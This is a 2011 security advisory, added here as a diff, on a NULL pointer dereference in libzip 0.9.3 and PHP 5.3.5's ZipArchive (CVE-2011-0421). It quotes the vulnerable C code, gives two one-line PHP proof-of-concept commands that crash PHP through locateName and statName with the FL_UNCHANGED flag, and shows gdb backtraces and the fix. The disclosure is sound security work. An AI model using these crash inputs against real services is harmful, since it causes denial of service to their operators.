@@ -1,0 +1,236 @@
+Source: http://securityreason.com/securityalert/8146
+
+libzip 0.9.3 _zip_name_locate NULL Pointer Dereference (incl PHP 5.3.5)
+
+Author: Maksymilian Arciemowicz
+http://securityreason.com/
+http://cxib.net/
+Date:
+- Dis.: 03.01.2011
+- Pub.: 18.03.2011
+
+CVE: CVE-2011-0421
+CERT: VU#325039
+
+Affected Software:
+- libzip 0.9.3
+- PHP 5.3.5 (fixed 5.3.6)
+
+Original URL:
+http://securityreason.com/achievement_securityalert/96
+
+
+--- 0.Description ---
+libzip is a C library for reading, creating, and modifying zip archives.
+Files can be added from data buffers, files, or compressed data copied
+directly from other zip archives. Changes made without closing the archive
+can be reverted. The API is documented by man pages.
+
+
+--- 1.Description ---
+libzip allows remote and local attackers to Denial of Service (Null Pointer
+Dereference) if ZIP_FL_UNCHANGED flag is set.
+
+-lib/zip_name_locate.c---
+int
+_zip_name_locate(struct zip *za, const char *fname, int flags,
+struct zip_error *error)
+{
+int (*cmp)(const char *, const char *);
+const char *fn, *p;
+int i, n;
+
+if (fname == NULL) {
+_zip_error_set(error, ZIP_ER_INVAL, 0);
+return -1;
+}
+
+cmp = (flags & ZIP_FL_NOCASE) ? strcasecmp : strcmp;
+
+n = (flags & ZIP_FL_UNCHANGED) ? za->cdir->nentry : za->nentry; <=
+CRASH HERE
+-lib/zip_name_locate.c---
+
+for empty zip file and ZIP_FL_UNCHANGED flag, libzip should crash.
+Currently for PHP, the security impact we estimate only like a remote DoS,
+so risk is low. 
+
+Project using libzip: KDE Utilities (4.x branch), MySQL Workbench, ckmame,
+fuse-zip, php zip extension, Endeavour2, FreeDink
+
+Better analysis based on PHP code ZipArchive, bellow
+
+
+--- 2. PHP 5.3.5 ZipArchive() ---
+PoC1:
+php -r '$nx=new
+ZipArchive();$nx->open("/dev/null");$nx->locateName("a",ZIPARCHIVE::FL_UNCH
+ANGED);'
+
+PoC2:
+php -r '$nx=new
+ZipArchive();$nx->open("empty.zip");$nx->statName("a",ZIPARCHIVE::FL_UNCHAN
+GED);'
+
+Let's
+-php_zip.c-------------------------------------
+...
+static ZIPARCHIVE_METHOD(locateName)
+{
+...
+ZIP_FROM_OBJECT(intern, this);
+
+if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s|l",
+&name, &name_len, &flags) == FAILURE) {
+return;
+}
+...
+idx = (long)zip_name_locate(intern, (const char *)name, flags); <=== CRASH
+IN THIS FUNCTION
+...
+-php_zip.c-------------------------------------
+
+and let`s see
+
+-zip_name_locate.c-------------------------------------
+ZIP_EXTERN(int)
+zip_name_locate(struct zip *za, const char *fname, int flags)
+{
+return _zip_name_locate(za, fname, flags, &za->error);
+}
+
+
+int
+_zip_name_locate(struct zip *za, const char *fname, int flags,
+struct zip_error *error)
+{
+int (*cmp)(const char *, const char *);
+const char *fn, *p;
+int i, n;
+
+if (fname == NULL) {
+_zip_error_set(error, ZIP_ER_INVAL, 0);
+return -1;
+}
+
+cmp = (flags & ZIP_FL_NOCASE) ? strcmpi : strcmp;
+
+n = (flags & ZIP_FL_UNCHANGED) ? za->cdir->nentry : za->nentry; <===
+CRASH HERE IF ZIPARCHIVE::FL_UNCHANGED
+for (i=0; i<n; i++) {
+...
+-zip_name_locate.c-------------------------------------
+
+(gdb) bt
+#0 0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x116ac70
+"a", flags=32767, 
+error=0xffffffff00000000) at
+/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65
+#1 0x00000000006381e6 in c_ziparchive_locateName (ht=2,
+return_value=0x1169418, return_value_ptr=0xffffffff, 
+this_ptr=0x118d530, return_value_used=-176126592) at
+/build/buildd/php5-5.3.3/ext/zip/php_zip.c:1877
+#2 0x00000000006e986a in zend_do_fcall_common_helper_SPEC
+(execute_data=0x7ffff7eb7068)
+at /build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:316
+#3 0x00000000006c0b00 in execute (op_array=0x1168568) at
+/build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:107
+...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x1169400
+"9223372036854775808", flags=32767, 
+error=0xffffffff00000000) at
+/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65
+65 n = (flags & ZIP_FL_UNCHANGED) ? za->cdir->nentry :
+za->nentry;
+(gdb) print za->cdir->nentry
+Cannot access memory at address 0x8
+(gdb) print za->nentry
+$21 = 0
+
+because 
+
+(gdb) x/i $rip
+=> 0x6407cc <_zip_name_locate+236>: mov 0x8(%rax),%eax
+(gdb) x/i $rax
+0x0: Cannot access memory at address 0x0
+(gdb) x/i $eax
+
+call to zip_name_locate
+
+(gdb) n
+1877 idx = (long)zip_name_locate(intern, (const char *)name,
+flags);
+(gdb) print intern
+$24 = (struct zip *) 0x118d580
+(gdb) x/x intern
+0x118d580: 0x0118d220
+(gdb) x/40x intern
+0x118d580: 0x0118d220 0x00000000 0x0118d340 0x00000000
+0x118d590: 0x00000000 0x00000000 0x00000000 0x00000000
+0x118d5a0: 0x00000000 0x00000000 0x00000000 0x00000000
+0x118d5b0: 0x00000000 0x00000000 0xffffffff 0x00000000
+0x118d5c0: 0x00000000 0x00000000 0x00000000 0x00000000
+0x118d5d0: 0x00000000 0x00000000 0x00000000 0x00000000
+0x118d5e0: 0x00000000 0x00000000 0x00020a21 0x00000000
+0x118d5f0: 0x00000000 0x00000000 0x00000000 0x00000000
+0x118d600: 0x00000000 0x00000000 0x00000000 0x00000000
+0x118d610: 0x00000000 0x00000000 0x00000000 0x00000000
+
+
+next PoC2
+
+$nx=new
+ZipArchive();$nx->open("empty.zip");$nx->statName("9223372036854775808","92
+23372036854775807");
+rogram received signal SIGSEGV, Segmentation fault.
+0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x11693f0
+"9223372036854775808", flags=32767, 
+error=0xffffffffffffdac0) at
+/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65
+65 in /build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c
+(gdb) bt
+#0 0x00000000006407cc in _zip_name_locate (za=0x118d520, fname=0x11693f0
+"9223372036854775808", flags=32767, 
+error=0xffffffffffffdac0) at
+/build/buildd/php5-5.3.3/ext/zip/lib/zip_name_locate.c:65
+#1 0x0000000000640a50 in zip_stat (za=0x118d520, fname=0x11693f0
+"9223372036854775808", flags=-1, 
+st=0x7fffffffda70) at
+/build/buildd/php5-5.3.3/ext/zip/lib/zip_stat.c:45
+#2 0x0000000000638451 in c_ziparchive_statName (ht=2,
+return_value=0x1169480, return_value_ptr=0xffffffff, 
+this_ptr=0x118d530, return_value_used=-176126592) at
+/build/buildd/php5-5.3.3/ext/zip/php_zip.c:1818
+#3 0x00000000006e986a in zend_do_fcall_common_helper_SPEC
+(execute_data=0x7ffff7eb7068)
+at /build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:316
+
+
+--- 3. Fix ---
+This issue has been fixed with PHP Team, so big thanks guys.
+
+http://www.php.net/ChangeLog-5.php#5.3.6
+
+http://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/zip/lib/zip_name
+_locate.c?annotate=307867
+
+
+--- 4. Greets ---
+Special thanks for Pierre Joye and Stas
+
+sp3x, Infospec,
+
+
+--- 5. Contact ---
+Author: Maksymilian Arciemowicz
+
+Email:
+- cxib {a\./t] securityreason [d=t} com
+
+GPG:
+- http://securityreason.com/key/Arciemowicz.Maksymilian.gpg
+
+http://securityreason.com/
+http://cxib.net/
